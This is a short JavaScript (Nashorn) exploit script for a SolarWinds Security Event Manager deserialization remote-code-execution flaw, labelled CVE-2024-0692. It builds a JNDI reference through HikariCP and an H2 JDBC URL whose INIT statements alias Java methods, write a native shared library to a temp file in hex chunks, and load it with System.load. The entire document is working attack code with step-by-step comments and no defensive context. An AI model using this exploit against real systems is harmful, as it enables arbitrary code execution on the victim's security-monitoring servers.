var Reference = Java.type("javax.naming.Reference");
var StringRefAddr = Java.type("javax.naming.StringRefAddr");
var File = Java.type("java.io.File");
var Files = Java.type("java.nio.file.Files");
var Paths = Java.type("java.nio.file.Paths");

// SolarWinds Security Event Manager AMF Deserialization RCE (CVE-2024-0692)
// file write + System.load

var prefix = "test";
var libPath = "/Users/exp10it/exp.so";

var list = [];

// drop the previous alias if exists
list.push("DROP ALIAS IF EXISTS CREATE_FILE");
list.push("DROP ALIAS IF EXISTS WRITE_FILE");
list.push("DROP ALIAS IF EXISTS INVOKE_METHOD");
list.push("DROP ALIAS IF EXISTS INVOKE_STATIC_METHOD");
list.push("DROP ALIAS IF EXISTS CLASS_FOR_NAME");

// alias some external Java methods
list.push("CREATE ALIAS CREATE_FILE FOR 'java.io.File.createTempFile(java.lang.String, java.lang.String)'");
list.push("CREATE ALIAS WRITE_FILE FOR 'org.apache.commons.io.FileUtils.writeByteArrayToFile(java.io.File, byte[], boolean)'");
list.push("CREATE ALIAS INVOKE_METHOD FOR 'org.apache.commons.beanutils.MethodUtils.invokeMethod(java.lang.Object, java.lang.String, java.lang.Object)'");
list.push("CREATE ALIAS INVOKE_STATIC_METHOD FOR 'org.apache.commons.beanutils.MethodUtils.invokeExactStaticMethod(java.lang.Class, java.lang.String, java.lang.Object)'");
list.push("CREATE ALIAS CLASS_FOR_NAME FOR 'java.lang.Class.forName(java.lang.String)'");

// use java.io.File.createTempFile() to create a blank file with `.so` extension
list.push("SET @file=CREATE_FILE('" + prefix + "', '.so')");

// read native library file and encode it to hex
var contentBytes = Files.readAllBytes(Paths.get(libPath));
var hexString = "";
for (var i = 0; i < contentBytes.length; i++) {
   var b = (contentBytes[i] & 0xFF).toString(16);
   if (b.length < 2) b = "0" + b;
   hexString += b;
}

// split it into several chunks to avoid SQL length limit
// and write the chunks to the file (append mode)
var chunkSize = 500;
for (var i = 0; i < hexString.length; i += chunkSize) {
   var chunk = hexString.substring(i, Math.min(i + chunkSize, hexString.length));
   list.push("CALL WRITE_FILE(@file, X'" + chunk + "', TRUE)");
}

// invoke file.getAbsolutePath() to get the absolute path of the temp file
list.push("SET @path=INVOKE_METHOD(@file, 'getAbsolutePath', NULL)");
// invoke java.lang.System.load() to load the native library
list.push("SET @clazz=CLASS_FOR_NAME('java.lang.System')");
list.push("CALL INVOKE_STATIC_METHOD(@clazz, 'load', @path)");

// use INIT property to execute multi SQL statements, and each statement must be separated by `\;`
var url = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=" + list.join("\\;") + "\\;";

var ref = new Reference("javax.sql.DataSource", "com.zaxxer.hikari.HikariJNDIFactory", null);
ref.add(new StringRefAddr("driverClassName", "org.h2.Driver"));
ref.add(new StringRefAddr("jdbcUrl", url));

ref;